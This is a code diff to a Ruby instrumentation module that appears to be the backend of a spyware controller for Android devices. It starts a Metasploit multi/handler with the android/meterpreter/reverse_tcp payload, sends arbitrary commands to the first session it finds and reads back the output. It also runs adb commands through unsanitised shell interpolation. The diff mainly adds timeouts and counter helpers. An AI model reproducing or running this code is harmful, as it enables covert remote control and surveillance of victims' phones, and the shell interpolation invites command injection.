@@ -2,6 +2,7 @@
 
 require 'msfrpc-client'
 require 'date'
+require 'timeout'
 require_relative '../lib/spyware_tracing'
 
 module MsfInstrumentation
@@ -71,39 +72,44 @@ module MsfInstrumentation
     def start_msf_process_traced(command)
       SpywareTracing.trace_session_command('active_session', command) do |span|
         begin
-          @@nrRunningProcesses += 1
-          # SonarQube S2068: Use centralized CredentialsService
-          user = CredentialsService.msf_user
-          password = CredentialsService.msf_password
-          options = CredentialsService.msf_options
+          increment_running_processes
+          Timeout.timeout((ENV['MSF_TIMEOUT_SECONDS'].presence || 20).to_i) do
+            # SonarQube S2068: Use centralized CredentialsService
+            user = CredentialsService.msf_user
+            password = CredentialsService.msf_password
+            options = CredentialsService.msf_options
 
-          rpc_client = InstrumentedMsfRpcClient.new(options)
-          rpc_client.login(user, password)
-          
-          SpywareTracing.trace_rpc_call('module.execute', { payload: 'android/meterpreter/reverse_tcp' }) do |module_span|
-            payloadOptions = {
-              'PAYLOAD' => 'android/meterpreter/reverse_tcp',
-              'LHOST' => '0.0.0.0',
-              'LPORT' => 4444,
-            }
-            job = rpc_client.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
-            module_span.set_attribute('job.id', job.to_s)
-          end
-
-          SpywareTracing.trace_rpc_call('session.list') do |session_span|
-            session = rpc_client.call('session.list').keys[0]
-            session_span.set_attribute('session.id', session)
+            rpc_client = InstrumentedMsfRpcClient.new(options)
+            rpc_client.login(user, password)
             
-            commandOutput = rpc_client.call('session.meterpreter_write', session, command)
-            sleep 4
-            commandOutput = rpc_client.call('session.meterpreter_read', session).values()[0].split('\n')
-            
-            span.set_attribute('command.status', 'success')
-            span.set_attribute('command.output.lines', commandOutput.length)
-          end
+            SpywareTracing.trace_rpc_call('module.execute', { payload: 'android/meterpreter/reverse_tcp' }) do |module_span|
+              payloadOptions = {
+                'PAYLOAD' => 'android/meterpreter/reverse_tcp',
+                'LHOST' => '0.0.0.0',
+                'LPORT' => 4444,
+              }
+              job = rpc_client.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
+              module_span.set_attribute('job.id', job.to_s)
+            end
 
-          rpc_client.logout
-          commandOutput
+            SpywareTracing.trace_rpc_call('session.list') do |session_span|
+              session = rpc_client.call('session.list').keys[0]
+              session_span.set_attribute('session.id', session)
+              
+              commandOutput = rpc_client.call('session.meterpreter_write', session, command)
+              sleep 4
+              commandOutput = rpc_client.call('session.meterpreter_read', session).values()[0].split('\n')
+              
+              span.set_attribute('command.status', 'success')
+              span.set_attribute('command.output.lines', commandOutput.length)
+            end
+
+            rpc_client.logout
+            commandOutput
+          end
+        rescue Timeout::Error => e
+          SpywareTracing.record_error(span, e, 'start_msf_process_timeout')
+          'Operation Failed: timeout'
         rescue Msf::RPC::ServerException => e
           SpywareTracing.record_error(span, e, 'start_msf_process')
           'Operation Failed'
@@ -111,8 +117,8 @@ module MsfInstrumentation
           SpywareTracing.record_error(span, e, 'start_msf_process')
           'Operation Failed'
         ensure
-          @@nrFinishedProcesses += 1
-          @@nrRunningProcesses -= 1
+          increment_finished_processes
+          decrement_running_processes
         end
       end
     end
@@ -121,19 +127,41 @@ module MsfInstrumentation
       SpywareTracing.trace_adb_operation(command) do |span|
         begin
           sleep 1
-          @@nrRunningProcesses += 1
-          commandOutput = `adb -H #{ENV['ADB_HOST']} -s #{@@adbTarget} #{command}`
+          increment_running_processes
+          adb_target = ApplicationController.adb_target
+          commandOutput = nil
+          Timeout.timeout((ENV['ADB_TIMEOUT_SECONDS'].presence || 10).to_i) do
+            commandOutput = `adb -H #{CredentialsService.adb_host} -s #{adb_target} #{command}`
+          end
           span.set_attribute('adb.command.status', 'success')
           span.set_attribute('adb.output.size', commandOutput.length)
           commandOutput
+        rescue Timeout::Error => e
+          SpywareTracing.record_error(span, e, 'run_adb_command_timeout')
+          'Operation Failed: timeout'
         rescue => e
           SpywareTracing.record_error(span, e, 'run_adb_command')
           'Operation Failed'
         ensure
-          @@nrFinishedProcesses += 1
-          @@nrRunningProcesses -= 1
+          increment_finished_processes
+          decrement_running_processes
         end
       end
+    end
+
+    private
+
+    def increment_running_processes
+      ApplicationController.nr_running_processes = ApplicationController.nr_running_processes.to_i + 1
+    end
+
+    def decrement_running_processes
+      current = ApplicationController.nr_running_processes.to_i
+      ApplicationController.nr_running_processes = [current - 1, 0].max
+    end
+
+    def increment_finished_processes
+      ApplicationController.nr_finished_processes = ApplicationController.nr_finished_processes.to_i + 1
     end
   end
 end
